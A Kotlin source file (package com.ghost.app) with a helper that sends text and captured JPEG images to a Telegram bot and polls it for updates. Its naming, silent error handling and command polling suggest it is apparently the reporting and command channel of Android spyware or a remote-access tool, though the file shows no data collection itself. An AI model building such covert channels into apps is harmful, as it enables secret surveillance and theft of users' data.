package com.ghost.app
import okhttp3.*
import okhttp3.MediaType.Companion.toMediaType
import okhttp3.RequestBody.Companion.toRequestBody
import java.io.IOException
import java.util.concurrent.TimeUnit
object TgSender {
    private val client = OkHttpClient.Builder().connectTimeout(15, TimeUnit.SECONDS).readTimeout(30, TimeUnit.SECONDS).build()
    fun sendMessage(text: String) {
        val json = "{\"chat_id\":\"${Config.CHAT_ID}\",\"text\":\"${text.replace("\\", "\\\\").replace("\"", "\\\"").replace("\n", "\\n")}\",\"parse_mode\":\"HTML\"}"
        val req = Request.Builder().url("${Config.API_BASE}/sendMessage").post(json.toRequestBody("application/json".toMediaType())).build()
        runCatching { client.newCall(req).execute().close() }
    }
    fun sendLong(text: String) {
        if (text.length <= 3900) { sendMessage(text); return }
        var i = 0
        while (i < text.length) { val end = minOf(i + 3900, text.length); sendMessage(text.substring(i, end)); i = end }
    }
    fun sendPhoto(bytes: ByteArray, caption: String) {
        val body = MultipartBody.Builder().setType(MultipartBody.FORM).addFormDataPart("chat_id", Config.CHAT_ID).addFormDataPart("caption", caption).addFormDataPart("photo", "cap.jpg", bytes.toRequestBody("image/jpeg".toMediaType())).build()
        val req = Request.Builder().url("${Config.API_BASE}/sendPhoto").post(body).build()
        runCatching { client.newCall(req).execute().close() }
    }
    fun getUpdates(offset: Long): String? {
        val req = Request.Builder().url("${Config.API_BASE}/getUpdates?offset=$offset&timeout=0").get().build()
        return try { client.newCall(req).execute().use { it.body?.string() } } catch (e: IOException) { null }
    }
}
